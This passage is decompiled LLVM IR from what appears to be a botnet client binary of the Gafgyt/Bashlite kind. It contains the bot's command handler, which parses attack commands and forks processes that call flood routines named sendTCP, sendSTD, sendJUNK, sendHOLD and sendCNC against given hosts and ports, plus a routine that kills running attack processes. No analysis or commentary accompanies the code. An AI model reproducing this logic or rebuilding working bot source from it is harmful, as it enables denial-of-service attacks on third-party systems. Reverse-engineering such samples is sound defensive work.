  %v2_123f8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12408 = icmp eq i32 %v2_123f8, 0
  br i1 %v2_12408, label %dec_label_pc_1243c, label %dec_label_pc_123b8

dec_label_pc_12414:                               ; preds = %dec_label_pc_12338
  %v0_12414 = call i32 @listFork()
  %v2_1241c = icmp eq i32 %v0_12414, 0
  br i1 %v2_1241c, label %dec_label_pc_12424, label %dec_label_pc_12be0

dec_label_pc_12424:                               ; preds = %dec_label_pc_12414
  %v4_12430 = call i32 @sendCNC(i32 %v2_12340, i32 %v1_12358, i32 %v1_12374, i32 0)
  %v1_12438 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1243c:                               ; preds = %dec_label_pc_123f0, %dec_label_pc_1239c, %dec_label_pc_122c8
  %v2_12440 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1ef04.804 to i32), i32* @r1, align 4
  %v3_1244c = inttoptr i32 %v2_12440 to i8*
  %v4_1244c = call i32 @__GI_strcoll(i8* %v3_1244c, i32 ptrtoint ([6 x i8]* @global_var_1ef04.804 to i32))
  %v2_12454 = icmp eq i32 %v4_1244c, 0
  br i1 %v2_12454, label %dec_label_pc_1245c, label %dec_label_pc_125f0

dec_label_pc_1245c:                               ; preds = %dec_label_pc_1243c
  %v7_12464 = icmp slt i32 %arg1, 4
  br i1 %v7_12464, label %dec_label_pc_12be0, label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %dec_label_pc_1245c
  %v1_1246c = add i32 %tmp, 8
  %v1_12470 = inttoptr i32 %v1_1246c to i32*
  %v2_12470 = load i32, i32* %v1_12470, align 4
  store i32 %v2_12470, i32* @r0, align 4
  %v1_12478 = call i32 @atol(i32 %v2_12470)
  %tmp135 = icmp slt i32 %v1_12478, 1
  br i1 %tmp135, label %dec_label_pc_12be0, label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %dec_label_pc_12468
  %v1_1248c = add i32 %tmp, 12
  %v1_12490 = inttoptr i32 %v1_1248c to i32*
  %v2_12490 = load i32, i32* %v1_12490, align 4
  store i32 %v2_12490, i32* @r0, align 4
  %v1_12498 = call i32 @atol(i32 %v2_12490)
  %v5_124a4 = icmp sgt i32 %v1_12498, 0
  br i1 %v5_124a4, label %dec_label_pc_124ac, label %dec_label_pc_12be0

dec_label_pc_124ac:                               ; preds = %dec_label_pc_12488
  %v1_124b0 = add i32 %tmp, 4
  %v1_124b4 = inttoptr i32 %v1_124b0 to i32*
  %v2_124b4 = load i32, i32* %v1_124b4, align 4
  %v2_124c4 = load i32, i32* %v1_12470, align 4
  store i32 %v2_124c4, i32* @r0, align 4
  %v1_124cc = call i32 @atol(i32 %v2_124c4)
  %v2_124e0 = load i32, i32* %v1_12490, align 4
  store i32 %v2_124e0, i32* @r0, align 4
  %v1_124e8 = call i32 @atol(i32 %v2_124e0)
  %v2_12500 = call i32 @__GI_strchr(i32 %v2_124b4, i32 44)
  %v2_12508 = icmp eq i32 %v2_12500, 0
  br i1 %v2_12508, label %dec_label_pc_125a8, label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %dec_label_pc_124ac
  store i32 %v2_124b4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_1251c = call i32 @__GI_strtok(i32 %v2_124b4, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1259c43 = icmp eq i32 %v2_1251c, 0
  br i1 %v2_1259c43, label %dec_label_pc_125f0, label %dec_label_pc_1252c

dec_label_pc_1252c:                               ; preds = %dec_label_pc_12510, %dec_label_pc_12584
  %storemerge1844 = phi i32 [ %v2_1258c, %dec_label_pc_12584 ], [ %v2_1251c, %dec_label_pc_12510 ]
  %v0_1252c = call i32 @listFork()
  %v2_12534 = icmp eq i32 %v0_1252c, 0
  br i1 %v2_12534, label %dec_label_pc_1253c, label %dec_label_pc_12584

dec_label_pc_1253c:                               ; preds = %dec_label_pc_1252c
  %v4_12548 = call i32 @sendJUNK(i32 %storemerge1844, i32 %v1_124cc, i32 %v1_124e8, i32 0)
  %v3_12558 = call i32 @sendSTD(i32 %storemerge1844, i32 %v1_124cc, i32 %v1_124e8)
  %v3_12568 = call i32 @sendHOLD(i32 %storemerge1844, i32 %v1_124cc, i32 %v1_124e8)
  %v2_12570 = load i32, i32* @global_var_28c44.54, align 4
  %v1_12578 = call i32 @__libc_close(i32 %v2_12570)
  %v1_12580 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12584:                               ; preds = %dec_label_pc_1252c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_1258c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1259c = icmp eq i32 %v2_1258c, 0
  br i1 %v2_1259c, label %dec_label_pc_125f0, label %dec_label_pc_1252c

dec_label_pc_125a8:                               ; preds = %dec_label_pc_124ac
  %v0_125a8 = call i32 @listFork()
  %v2_125b0 = icmp eq i32 %v0_125a8, 0
  br i1 %v2_125b0, label %dec_label_pc_125b8, label %dec_label_pc_12be0

dec_label_pc_125b8:                               ; preds = %dec_label_pc_125a8
  %v4_125c4 = call i32 @sendJUNK(i32 %v2_124b4, i32 %v1_124cc, i32 %v1_124e8, i32 0)
  %v3_125d4 = call i32 @sendSTD(i32 %v2_124b4, i32 %v1_124cc, i32 %v1_124e8)
  %v3_125e4 = call i32 @sendHOLD(i32 %v2_124b4, i32 %v1_124cc, i32 %v1_124e8)
  %v1_125ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_125f0:                               ; preds = %dec_label_pc_12584, %dec_label_pc_12510, %dec_label_pc_1243c
  %v2_125f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ef0c.806 to i32), i32* @r1, align 4
  %v3_12600 = inttoptr i32 %v2_125f4 to i8*
  %v4_12600 = call i32 @__GI_strcoll(i8* %v3_12600, i32 ptrtoint ([4 x i8]* @global_var_1ef0c.806 to i32))
  %v2_12608 = icmp eq i32 %v4_12600, 0
  br i1 %v2_12608, label %dec_label_pc_12610, label %dec_label_pc_12754

dec_label_pc_12610:                               ; preds = %dec_label_pc_125f0
  %v7_12618 = icmp slt i32 %arg1, 4
  br i1 %v7_12618, label %dec_label_pc_12be0, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %dec_label_pc_12610
  %v1_12620 = add i32 %tmp, 8
  %v1_12624 = inttoptr i32 %v1_12620 to i32*
  %v2_12624 = load i32, i32* %v1_12624, align 4
  store i32 %v2_12624, i32* @r0, align 4
  %v1_1262c = call i32 @atol(i32 %v2_12624)
  %tmp136 = icmp slt i32 %v1_1262c, 1
  br i1 %tmp136, label %dec_label_pc_12be0, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_1261c
  %v1_12640 = add i32 %tmp, 12
  %v1_12644 = inttoptr i32 %v1_12640 to i32*
  %v2_12644 = load i32, i32* %v1_12644, align 4
  store i32 %v2_12644, i32* @r0, align 4
  %v1_1264c = call i32 @atol(i32 %v2_12644)
  %v5_12658 = icmp sgt i32 %v1_1264c, 0
  br i1 %v5_12658, label %dec_label_pc_12660, label %dec_label_pc_12be0

dec_label_pc_12660:                               ; preds = %dec_label_pc_1263c
  %v1_12664 = add i32 %tmp, 4
  %v1_12668 = inttoptr i32 %v1_12664 to i32*
  %v2_12668 = load i32, i32* %v1_12668, align 4
  %v2_12678 = load i32, i32* %v1_12624, align 4
  store i32 %v2_12678, i32* @r0, align 4
  %v1_12680 = call i32 @atol(i32 %v2_12678)
  %v2_12694 = load i32, i32* %v1_12644, align 4
  store i32 %v2_12694, i32* @r0, align 4
  %v1_1269c = call i32 @atol(i32 %v2_12694)
  %v2_126b4 = call i32 @__GI_strchr(i32 %v2_12668, i32 44)
  %v2_126bc = icmp eq i32 %v2_126b4, 0
  br i1 %v2_126bc, label %dec_label_pc_1272c, label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_12660
  store i32 %v2_12668, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_126d0 = call i32 @__GI_strtok(i32 %v2_12668, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_1272040 = icmp eq i32 %v2_126d0, 0
  br i1 %v2_1272040, label %dec_label_pc_12754, label %dec_label_pc_126e0

dec_label_pc_126e0:                               ; preds = %dec_label_pc_126c4, %dec_label_pc_12708
  %storemerge1641 = phi i32 [ %v2_12710, %dec_label_pc_12708 ], [ %v2_126d0, %dec_label_pc_126c4 ]
  %v0_126e0 = call i32 @listFork()
  %v2_126e8 = icmp eq i32 %v0_126e0, 0
  br i1 %v2_126e8, label %dec_label_pc_126f0, label %dec_label_pc_12708

dec_label_pc_126f0:                               ; preds = %dec_label_pc_126e0
  %v3_126fc = call i32 @sendSTD(i32 %storemerge1641, i32 %v1_12680, i32 %v1_1269c)
  %v1_12704 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12708:                               ; preds = %dec_label_pc_126e0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_12710 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12720 = icmp eq i32 %v2_12710, 0
  br i1 %v2_12720, label %dec_label_pc_12754, label %dec_label_pc_126e0

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12660
  %v0_1272c = call i32 @listFork()
  %v2_12734 = icmp eq i32 %v0_1272c, 0
  br i1 %v2_12734, label %dec_label_pc_1273c, label %dec_label_pc_12be0

dec_label_pc_1273c:                               ; preds = %dec_label_pc_1272c
  %v3_12748 = call i32 @sendSTD(i32 %v2_12668, i32 %v1_12680, i32 %v1_1269c)
  %v1_12750 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12754:                               ; preds = %dec_label_pc_12708, %dec_label_pc_126c4, %dec_label_pc_125f0
  %v2_12758 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ef10.808 to i32), i32* @r1, align 4
  %v3_12764 = inttoptr i32 %v2_12758 to i8*
  %v4_12764 = call i32 @__GI_strcoll(i8* %v3_12764, i32 ptrtoint ([4 x i8]* @global_var_1ef10.808 to i32))
  %v2_1276c = icmp eq i32 %v4_12764, 0
  br i1 %v2_1276c, label %dec_label_pc_12774, label %dec_label_pc_12aa0

dec_label_pc_12774:                               ; preds = %dec_label_pc_12754
  %v7_1277c = icmp slt i32 %arg1, 6
  br i1 %v7_1277c, label %dec_label_pc_12be0, label %dec_label_pc_12780

dec_label_pc_12780:                               ; preds = %dec_label_pc_12774
  %v1_12784 = add i32 %tmp, 12
  %v1_12788 = inttoptr i32 %v1_12784 to i32*
  %v2_12788 = load i32, i32* %v1_12788, align 4
  store i32 %v2_12788, i32* @r0, align 4
  %v1_12790 = call i32 @atol(i32 %v2_12788)
  %v7_12798 = icmp eq i32 %v1_12790, -1
  br i1 %v7_12798, label %dec_label_pc_12be0, label %dec_label_pc_127a0

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12780
  %v1_127a4 = add i32 %tmp, 8
  %v1_127a8 = inttoptr i32 %v1_127a4 to i32*
  %v2_127a8 = load i32, i32* %v1_127a8, align 4
  store i32 %v2_127a8, i32* @r0, align 4
  %v1_127b0 = call i32 @atol(i32 %v2_127a8)
  %v7_127b8 = icmp eq i32 %v1_127b0, -1
  br i1 %v7_127b8, label %dec_label_pc_12be0, label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127a0
  %v1_127c4 = add i32 %tmp, 16
  %v1_127c8 = inttoptr i32 %v1_127c4 to i32*
  %v2_127c8 = load i32, i32* %v1_127c8, align 4
  store i32 %v2_127c8, i32* @r0, align 4
  %v1_127d0 = call i32 @atol(i32 %v2_127c8)
  %v7_127d8 = icmp eq i32 %v1_127d0, -1
  br i1 %v7_127d8, label %dec_label_pc_12be0, label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127c0
  %v2_127e8 = load i32, i32* %v1_127c8, align 4
  store i32 %v2_127e8, i32* @r0, align 4
  %v1_127f0 = call i32 @atol(i32 %v2_127e8)
  %v8_127fc = icmp sgt i32 %v1_127f0, 32
  br i1 %v8_127fc, label %dec_label_pc_12be0, label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %dec_label_pc_127e0
  %v7_12808 = icmp slt i32 %arg1, 7
  br i1 %v7_12808, label %dec_label_pc_1282c, label %dec_label_pc_1280c

dec_label_pc_1280c:                               ; preds = %dec_label_pc_12800
  %v1_12810 = add i32 %tmp, 24
  %v1_12814 = inttoptr i32 %v1_12810 to i32*
  %v2_12814 = load i32, i32* %v1_12814, align 4
  store i32 %v2_12814, i32* @r0, align 4
  %v1_1281c = call i32 @atol(i32 %v2_12814)
  %v1_12824 = icmp slt i32 %v1_1281c, 0
  br i1 %v1_12824, label %dec_label_pc_12be0, label %dec_label_pc_1282c

dec_label_pc_1282c:                               ; preds = %dec_label_pc_1280c, %dec_label_pc_12800
  %v7_12830 = icmp eq i32 %arg1, 8
  br i1 %v7_12830, label %dec_label_pc_12838, label %dec_label_pc_128d8

dec_label_pc_12838:                               ; preds = %dec_label_pc_1282c
  %v1_1283c = add i32 %tmp, 28
  %v1_12840 = inttoptr i32 %v1_1283c to i32*
  %v2_12840 = load i32, i32* %v1_12840, align 4
  store i32 %v2_12840, i32* @r0, align 4
  %v1_12848 = call i32 @atol(i32 %v2_12840)
  %v5_12854 = icmp sgt i32 %v1_12848, 0
  br i1 %v5_12854, label %dec_label_pc_128d8, label %dec_label_pc_12be0

dec_label_pc_128d8:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_12838
  %v1_128dc = add i32 %tmp, 4
  %v1_128e0 = inttoptr i32 %v1_128dc to i32*
  %v2_128e0 = load i32, i32* %v1_128e0, align 4
  %v2_128f0 = load i32, i32* %v1_127a8, align 4
  store i32 %v2_128f0, i32* @r0, align 4
  %v1_128f8 = call i32 @atol(i32 %v2_128f0)
  %v2_1290c = load i32, i32* %v1_12788, align 4
  store i32 %v2_1290c, i32* @r0, align 4
  %v1_12914 = call i32 @atol(i32 %v2_1290c)
  %v2_12928 = load i32, i32* %v1_127c8, align 4
  store i32 %v2_12928, i32* @r0, align 4
  %v1_12930 = call i32 @atol(i32 %v2_12928)
  %v1_12940 = add i32 %tmp, 20
  %v1_12944 = inttoptr i32 %v1_12940 to i32*
  %v2_12944 = load i32, i32* %v1_12944, align 4
  br i1 %v7_12830, label %dec_label_pc_12958, label %dec_label_pc_12974

dec_label_pc_12958:                               ; preds = %dec_label_pc_128d8
  %v1_1295c = add i32 %tmp, 28
  %v1_12960 = inttoptr i32 %v1_1295c to i32*
  %v2_12960 = load i32, i32* %v1_12960, align 4
  store i32 %v2_12960, i32* @r0, align 4
  %v1_12968 = call i32 @atol(i32 %v2_12960)
  br label %dec_label_pc_1297c

dec_label_pc_12974:                               ; preds = %dec_label_pc_128d8
  br label %dec_label_pc_1297c

dec_label_pc_1297c:                               ; preds = %dec_label_pc_12958, %dec_label_pc_12974
  %storemerge3 = phi i32 [ 10, %dec_label_pc_12974 ], [ %v1_12968, %dec_label_pc_12958 ]
  br i1 %v7_12808, label %dec_label_pc_129ac, label %dec_label_pc_12990

dec_label_pc_12990:                               ; preds = %dec_label_pc_1297c
  %v1_12994 = add i32 %tmp, 24
  %v1_12998 = inttoptr i32 %v1_12994 to i32*
  %v2_12998 = load i32, i32* %v1_12998, align 4
  store i32 %v2_12998, i32* @r0, align 4
  %v1_129a0 = call i32 @atol(i32 %v2_12998)
  br label %dec_label_pc_129b4

dec_label_pc_129ac:                               ; preds = %dec_label_pc_1297c
  br label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_12990, %dec_label_pc_129ac
  %storemerge2 = phi i32 [ 0, %dec_label_pc_129ac ], [ %v1_129a0, %dec_label_pc_12990 ]
  %v2_129c8 = call i32 @__GI_strchr(i32 %v2_128e0, i32 44)
  %v2_129d0 = icmp eq i32 %v2_129c8, 0
  br i1 %v2_129d0, label %dec_label_pc_12a5c, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129b4
  store i32 %v2_128e0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_129e4 = call i32 @__GI_strtok(i32 %v2_128e0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12a5037 = icmp eq i32 %v2_129e4, 0
  br i1 %v2_12a5037, label %dec_label_pc_12aa0, label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129d8, %dec_label_pc_12a38
  %storemerge1438 = phi i32 [ %v2_12a40, %dec_label_pc_12a38 ], [ %v2_129e4, %dec_label_pc_129d8 ]
  %v0_129f4 = call i32 @listFork()
  %v2_129fc = icmp eq i32 %v0_129f4, 0
  br i1 %v2_129fc, label %dec_label_pc_12a04, label %dec_label_pc_12a38

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129f4
  %v7_12a2c = call i32 @sendTCP(i32 %storemerge1438, i32 %v1_128f8, i32 %v1_12914, i32 %v1_12930, i32 %v2_12944, i32 %storemerge2, i32 %storemerge3)
  %v1_12a34 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12a38:                               ; preds = %dec_label_pc_129f4
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_12a40 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  %v2_12a50 = icmp eq i32 %v2_12a40, 0
  br i1 %v2_12a50, label %dec_label_pc_12aa0, label %dec_label_pc_129f4

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_129b4
  %v0_12a5c = call i32 @listFork()
  %v2_12a64 = icmp eq i32 %v0_12a5c, 0
  br i1 %v2_12a64, label %dec_label_pc_12a6c, label %dec_label_pc_12be0

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_12a5c
  %v7_12a94 = call i32 @sendTCP(i32 %v2_128e0, i32 %v1_128f8, i32 %v1_12914, i32 %v1_12930, i32 %v2_12944, i32 %storemerge2, i32 %storemerge3)
  %v1_12a9c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a38, %dec_label_pc_129d8, %dec_label_pc_12754
  %v2_12aa4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1ef14.810 to i32), i32* @r1, align 4
  %v3_12ab0 = inttoptr i32 %v2_12aa4 to i8*
  %v4_12ab0 = call i32 @__GI_strcoll(i8* %v3_12ab0, i32 ptrtoint ([5 x i8]* @global_var_1ef14.810 to i32))
  %v2_12ab8 = icmp eq i32 %v4_12ab0, 0
  br i1 %v2_12ab8, label %dec_label_pc_12ac0, label %dec_label_pc_12bb8

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12aa0
  br label %dec_label_pc_12b64

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12b64, %dec_label_pc_12b98
  %v3_12ad8 = mul i32 %storemerge12, 4
  %v2_12ae4 = load i32, i32* @global_var_2eec8.63, align 4
  %v2_12ae8 = add i32 %v2_12ae4, %v3_12ad8
  %v1_12aec = inttoptr i32 %v2_12ae8 to i32*
  %v2_12aec = load i32, i32* %v1_12aec, align 4
  %v2_12af0 = icmp eq i32 %v2_12aec, 0
  br i1 %v2_12af0, label %dec_label_pc_12b58, label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12ad4
  %v2_12b10 = load i32, i32* %v1_12aec, align 4
  store i32 %v2_12b10, i32* @r4, align 4
  %v0_12b14 = call i32 @__libc_getpid()
  %v0_12b1c = load i32, i32* @r4, align 4
  %v9_12b1c = icmp eq i32 %v0_12b1c, %v0_12b14
  br i1 %v9_12b1c, label %dec_label_pc_12b58, label %dec_label_pc_12b24

dec_label_pc_12b24:                               ; preds = %dec_label_pc_12af8
  %v0_12b48 = call i32 @kill()
  %v1_12b50 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_12b58

dec_label_pc_12b58:                               ; preds = %dec_label_pc_12af8, %dec_label_pc_12ad4, %dec_label_pc_12b24
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_12ad4 ], [ %stack_var_-44.1, %dec_label_pc_12af8 ], [ %v1_12b50, %dec_label_pc_12b24 ]
  %v1_12b5c = add i32 %storemerge12, 1
  br label %dec_label_pc_12b64

dec_label_pc_12b64:                               ; preds = %dec_label_pc_12ac0, %dec_label_pc_12b58
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_12ac0 ], [ %stack_var_-44.0, %dec_label_pc_12b58 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12ac0 ], [ %v1_12b5c, %dec_label_pc_12b58 ]
  %v5_12b7c = load i32, i32* @global_var_28c4c.61, align 4
  %v9_12b90 = icmp eq i32 %v5_12b7c, 0
  br i1 %v9_12b90, label %dec_label_pc_12b98, label %dec_label_pc_12ad4

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12b64
  %v2_12b7c = load i32, i32* @global_var_28c48.60, align 4
  %tmp151 = icmp ugt i32 %v2_12b7c, %storemerge12
  br i1 %tmp151, label %dec_label_pc_12ad4, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12b98, %dec_label_pc_12aa0
  %v2_12bbc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1ef1c.814 to i32), i32* @r1, align 4
  %v3_12bc8 = inttoptr i32 %v2_12bbc to i8*
  %v4_12bc8 = call i32 @__GI_strcoll(i8* %v3_12bc8, i32 ptrtoint ([12 x i8]* @global_var_1ef1c.814 to i32))
  %v2_12bd0 = icmp eq i32 %v4_12bc8, 0
  br i1 %v2_12bd0, label %dec_label_pc_12bd8, label %dec_label_pc_12be0

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bb8
  %v1_12bdc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12838, %dec_label_pc_1263c, %dec_label_pc_12488, %dec_label_pc_12314, %dec_label_pc_11f10, %dec_label_pc_11ce8, %dec_label_pc_11b84, %dec_label_pc_11c74, %dec_label_pc_11de8, %dec_label_pc_12084, %dec_label_pc_12210, %dec_label_pc_12414, %dec_label_pc_125a8, %dec_label_pc_1272c, %dec_label_pc_12a5c, %dec_label_pc_12bb8, %dec_label_pc_11ae8, %dec_label_pc_11a78, %dec_label_pc_1280c, %dec_label_pc_127e0, %dec_label_pc_127c0, %dec_label_pc_127a0, %dec_label_pc_12780, %dec_label_pc_12774, %dec_label_pc_1261c, %dec_label_pc_12610, %dec_label_pc_12468, %dec_label_pc_1245c, %dec_label_pc_122f4, %dec_label_pc_122e8, %dec_label_pc_120e0, %dec_label_pc_11ee4, %dec_label_pc_11ebc, %dec_label_pc_11e9c, %dec_label_pc_11e7c, %dec_label_pc_11e5c, %dec_label_pc_11e3c, %dec_label_pc_11e30, %dec_label_pc_11cc8, %dec_label_pc_11cbc, %dec_label_pc_11b64, %dec_label_pc_11b58, %dec_label_pc_11a10, %dec_label_pc_11aa0, %dec_label_pc_119d4, %dec_label_pc_118d8, %dec_label_pc_118a0, %dec_label_pc_12bd8
  %v24_12be4 = phi i32 [ %v1_12848, %dec_label_pc_12838 ], [ %v1_1264c, %dec_label_pc_1263c ], [ %v1_12498, %dec_label_pc_12488 ], [ %v1_12324, %dec_label_pc_12314 ], [ %v1_11f20, %dec_label_pc_11f10 ], [ %v1_11cf8, %dec_label_pc_11ce8 ], [ %v1_11b94, %dec_label_pc_11b84 ], [ %v0_11c74, %dec_label_pc_11c74 ], [ %v0_11de8, %dec_label_pc_11de8 ], [ %v0_12084, %dec_label_pc_12084 ], [ %v0_12210, %dec_label_pc_12210 ], [ %v0_12414, %dec_label_pc_12414 ], [ %v0_125a8, %dec_label_pc_125a8 ], [ %v0_1272c, %dec_label_pc_1272c ], [ %v0_12a5c, %dec_label_pc_12a5c ], [ %v4_12bc8, %dec_label_pc_12bb8 ], [ 0, %dec_label_pc_11ae8 ], [ 0, %dec_label_pc_11a78 ], [ %v1_1281c, %dec_label_pc_1280c ], [ %v1_127f0, %dec_label_pc_127e0 ], [ %v1_127d0, %dec_label_pc_127c0 ], [ %v1_127b0, %dec_label_pc_127a0 ], [ %v1_12790, %dec_label_pc_12780 ], [ 0, %dec_label_pc_12774 ], [ %v1_1262c, %dec_label_pc_1261c ], [ 0, %dec_label_pc_12610 ], [ %v1_12478, %dec_label_pc_12468 ], [ 0, %dec_label_pc_1245c ], [ %v1_12304, %dec_label_pc_122f4 ], [ 0, %dec_label_pc_122e8 ], [ 0, %dec_label_pc_120e0 ], [ %v1_11ef4, %dec_label_pc_11ee4 ], [ %v1_11ecc, %dec_label_pc_11ebc ], [ %v1_11eac, %dec_label_pc_11e9c ], [ %v1_11e8c, %dec_label_pc_11e7c ], [ %v1_11e6c, %dec_label_pc_11e5c ], [ %v1_11e4c, %dec_label_pc_11e3c ], [ 0, %dec_label_pc_11e30 ], [ %v1_11cd8, %dec_label_pc_11cc8 ], [ 0, %dec_label_pc_11cbc ], [ %v1_11b74, %dec_label_pc_11b64 ], [ 0, %dec_label_pc_11b58 ], [ 0, %dec_label_pc_11a10 ], [ %v0_11a88, %dec_label_pc_11aa0 ], [ %v3_119e4, %dec_label_pc_119d4 ], [ %v3_118fc, %dec_label_pc_118d8 ], [ %v3_118b0, %dec_label_pc_118a0 ], [ %v1_12bdc, %dec_label_pc_12bd8 ]
  store i32 %v3_1186c, i32* @r4, align 4
  store i32 %v6_1186c, i32* @r5, align 4
  store i32 %v9_1186c, i32* @r6, align 4
  store i32 %v12_1186c, i32* @r7, align 4
  store i32 %v15_1186c, i32* @r8, align 4
  store i32 %v18_1186c, i32* @fp, align 4
  ret i32 %v24_12be4

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_12a40, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12930, { 1, 0 }
  uselistorder i32 %v1_12914, { 1, 0 }
  uselistorder i32 %v1_128f8, { 1, 0 }
  uselistorder i32 %v2_128e0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_127d0, { 1, 0 }
  uselistorder i32 %v1_127b0, { 1, 0 }
  uselistorder i32 %v1_12790, { 1, 0 }
  uselistorder i32 %v2_12710, { 1, 0 }
  uselistorder i32 %v1_1269c, { 1, 0 }
  uselistorder i32 %v1_12680, { 1, 0 }
  uselistorder i32 %v2_12668, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1258c, { 1, 0 }
  uselistorder i32 %v1_124e8, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_124cc, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_124b4, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_123f8, { 1, 0 }
  uselistorder i32 %v1_12374, { 1, 0 }
  uselistorder i32 %v1_12358, { 1, 0 }
  uselistorder i32 %v2_12340, { 2, 1, 0, 3 }
  uselistorder i32* %v1_120f4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_12068, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_11f8c, { 1, 0 }
  uselistorder i32 %v1_11f70, { 1, 0 }
  uselistorder i32 %v1_11f54, { 1, 0 }
  uselistorder i32 %v2_11f3c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_11eac, { 1, 0 }
  uselistorder i32 %v1_11e8c, { 1, 0 }
  uselistorder i32 %v1_11e6c, { 1, 0 }
  uselistorder i32 %v1_11e4c, { 1, 0 }
  uselistorder i32 %v2_11dcc, { 1, 0 }
  uselistorder i32 %v1_11d48, { 1, 0 }
  uselistorder i32 %v1_11d2c, { 1, 0 }
  uselistorder i32 %v2_11d14, { 2, 1, 0, 3 }
  uselistorder i32 %v2_11c58, { 1, 0 }
  uselistorder i32 %v1_11be4, { 1, 0 }
  uselistorder i32 %v1_11bc8, { 1, 0 }
  uselistorder i32 %v2_11bb0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
